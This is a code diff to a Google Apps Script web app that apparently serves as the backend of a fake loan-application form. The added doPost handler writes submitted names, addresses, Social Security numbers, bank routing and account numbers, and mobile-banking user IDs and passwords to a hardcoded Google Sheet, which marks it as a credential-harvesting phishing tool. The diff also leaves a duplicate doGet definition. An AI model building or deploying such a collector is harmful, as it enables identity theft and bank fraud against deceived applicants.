@@ -5,136 +5,52 @@
 // Paste this code
 // Save and Deploy as Web App
 
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+
 function doGet(e) {
   return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
 }
 
 function doPost(e) {
   try {
-    // Log the incoming request
-    Logger.log('=== NEW REQUEST RECEIVED ===');
-    Logger.log('Request method: ' + e.postData.length);
-    Logger.log('Content type: ' + e.parameters);
-    
-    // Parse the posted data
-    let postData;
-    try {
-      postData = JSON.parse(e.postData.contents);
-      Logger.log('Parsed data: ' + JSON.stringify(postData));
-    } catch (parseError) {
-      Logger.log('Parse error: ' + parseError.toString());
-      return ContentService.createTextOutput(JSON.stringify({
-        status: 'error',
-        message: 'Invalid JSON data',
-        error: parseError.toString()
-      })).setMimeType(ContentService.MimeType.JSON);
-    }
-    
-    // Get or create the active spreadsheet
-    let spreadsheet;
-    try {
-      spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
-      Logger.log('Using active spreadsheet: ' + spreadsheet.getUrl());
-    } catch (e) {
-      Logger.log('No active spreadsheet, creating new one');
-      spreadsheet = SpreadsheetApp.create('Loan Applications');
-      Logger.log('Created new spreadsheet: ' + spreadsheet.getUrl());
-    }
-    
-    // Get or create the sheet
-    let sheet = spreadsheet.getSheetByName('Loan Applications');
-    if (!sheet) {
-      sheet = spreadsheet.insertSheet('Loan Applications');
-      Logger.log('Created new sheet: Loan Applications');
-    }
-    
-    // Add headers if sheet is empty
-    if (sheet.getLastRow() === 0) {
-      const headers = [
-        'Timestamp',
-        'Test',
-        'Message',
-        'Loan Amount',
-        'Loan Purpose',
-        'Name',
-        'Email',
-        'Phone',
-        'Street Address',
-        'City',
-        'State',
-        'Zip Code',
-        'Social Security',
-        'Bank Name',
-        'Routing Number',
-        'Account Number',
-        'Annual Income',
-        'Employment Status',
-        'Monthly Housing',
-        'Your Bank',
-        'Mobile Banking User ID',
-        'Mobile Banking Password',
-        'Application Type'
-      ];
-      sheet.appendRow(headers);
-      Logger.log('Added headers to sheet');
-    }
-    
-    // Prepare row data
-    const rowData = [
-      new Date().toLocaleString(),
-      postData.test || 'No',
-      postData.message || 'No message',
-      postData.loanAmount || '',
-      postData.loanPurpose || '',
-      postData.name || '',
-      postData.email || '',
-      postData.phone || '',
-      postData.streetAddress || '',
-      postData.city || '',
-      postData.state || '',
-      postData.zipCode || '',
-      postData.socialSecurity || '',
-      postData.bankName || '',
-      postData.routingNumber || '',
-      postData.accountNumber || '',
-      postData.annualIncome || '',
-      postData.employmentStatus || '',
-      postData.monthlyHousing || '',
-      postData.yourBank || '',
-      postData.mobileBankingUserId || '',
-      postData.mobileBankingPassword || '',
-      postData.applicationType || 'Test Submission'
-    ];
-    
-    // Append the row
-    sheet.appendRow(rowData);
-    Logger.log('Data appended to row ' + sheet.getLastRow());
-    
-    // Return success response
-    const response = {
-      status: 'success',
-      message: 'Data saved successfully',
-      row: sheet.getLastRow(),
-      spreadsheetUrl: spreadsheet.getUrl(),
-      data: rowData
-    };
-    
-    Logger.log('Returning success: ' + JSON.stringify(response));
-    
-    return ContentService.createTextOutput(JSON.stringify(response))
+    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
+    const data = JSON.parse(e.postData.contents);
+
+    sheet.appendRow([
+      data.loanAmount || "",
+      data.loanPurpose || "",
+      data.creditScore || "",
+      data.name || "",
+      data.email || "",
+      data.phone || "",
+      data.streetAddress || "",
+      data.city || "",
+      data.state || "",
+      data.zipCode || "",
+      data.ssn || "",
+      data.annualIncome || "",
+      data.employmentStatus || "",
+      data.monthlyHousing || "",
+      data.bankName || "",
+      data.routingNumber || "",
+      data.accountNumber || "",
+      data.yourBank || "",
+      data.mobileBankingUserId || "",
+      data.mobileBankingPassword || "",
+      new Date()
+    ]);
+
+    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
       .setMimeType(ContentService.MimeType.JSON);
-    
-  } catch (error) {
-    Logger.log('ERROR: ' + error.toString());
-    Logger.log('Stack: ' + error.stack);
-    
-    return ContentService.createTextOutput(JSON.stringify({
-      status: 'error',
-      message: error.toString(),
-      error: error.message,
-      stack: error.stack
-    })).setMimeType(ContentService.MimeType.JSON);
+
+  } catch (err) {
+    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
+      .setMimeType(ContentService.MimeType.JSON);
   }
+}
+
+function doGet() {
+  return ContentService.createTextOutput("Google Sheets API working");
 }
 
 // Helper function to get spreadsheet info
